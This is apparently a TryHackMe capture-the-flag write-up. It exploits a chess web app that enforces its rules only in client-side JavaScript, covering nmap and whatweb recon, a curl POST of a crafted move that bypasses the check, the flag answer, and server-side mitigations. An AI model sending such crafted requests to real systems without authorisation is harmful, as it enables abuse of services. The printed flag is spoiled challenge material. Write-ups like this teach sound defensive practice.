🧠 TryHackMe Write-up: Endgame Trainer (Fool’s Mate)
📌 Overview

This write-up documents the exploitation of the Fool’s Mate / Endgame Trainer challenge from TryHackMe.

The room demonstrates a critical security flaw: client-side game logic validation, where game rules are enforced in JavaScript instead of the server. This allows an attacker to bypass restrictions and send crafted requests directly to the backend.

🎯 Objective
Perform reconnaissance on exposed services
Analyze client-side JavaScript logic
Identify flawed security controls
Exploit server-side API directly
Capture the hidden flag
🔍 Reconnaissance

An initial Nmap scan was performed against the target host:

nmap -sC -sV -A <target-ip>
Results:
Port 22/tcp → SSH (OpenSSH 9.6p1 Ubuntu)
Port 80/tcp → HTTP (Node.js Express framework)

The web service hosted an application called:

Endgame Trainer

🌐 Web Enumeration

To further analyze the web application, a technology fingerprinting scan was performed:

whatweb http://<target-ip>
Findings:
Node.js Express backend
JavaScript-heavy frontend
Chess-based interactive game interface
🧩 Client-Side Analysis

Upon inspecting the browser-based game, the logic for move validation was implemented in JavaScript:

if (probe.isCheckmate()) {
    showSystemNotice("I'll shut down your PC if you play that.");
    return false;
}
Key Observation:
The checkmate validation occurs only in the browser
This means the server does not enforce game rules
Client-side logic can be bypassed entirely

This is a classic security misconfiguration: trusting the client

💥 Exploitation

Since the backend accepts requests independently of the frontend validation, it is possible to bypass the UI entirely and send direct HTTP requests.

Using curl, a crafted move was sent directly to the API:

curl -X POST http://<target-ip>/move \
  -H "Content-Type: application/json" \
  -d '{
    "from": "a1",
    "to": "a8"
}'

This move forced a checkmate condition without triggering the frontend restriction.

🚩 Flag Capture

The server responded with a successful checkmate state:

{
  "status": "checkmate",
  "winner": "white",
  "flag": "THM{cl13nt_s1d3_ch3ckm4t3}"
}

✔ Flag successfully retrieved.

🧠 Key Takeaways
Never trust client-side validation for security decisions
Frontend logic can always be modified or bypassed
All critical rules must be enforced server-side
API endpoints should validate state independently of UI
🧾 Security Insight

This challenge highlights a common real-world vulnerability:

Client-Side Enforcement Weakness

Attackers can:

Intercept requests (Burp Suite/curl)
Modify parameters
Skip UI restrictions entirely

Proper mitigation:

Server-side validation of all game logic
State verification before accepting moves
Treat the frontend as an untrusted input source
